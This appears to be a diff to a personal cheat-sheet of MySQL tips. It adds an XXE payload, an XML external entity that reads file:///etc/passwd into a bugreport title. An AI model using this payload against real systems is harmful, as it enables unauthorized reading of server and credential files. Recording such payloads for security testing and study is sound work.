@@ -185,3 +185,8 @@ use SuperDB;
 show tables;
 
 When doing sql queries, if you add \G to the end, it will show the fields in a vertical list which makes tables with a lot of fields sooo much easier to read.  e.g., SELECT * FROM users\G;
+
+XXE
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>  
+           <bugreport>  
+           <title>&xxe;</title>
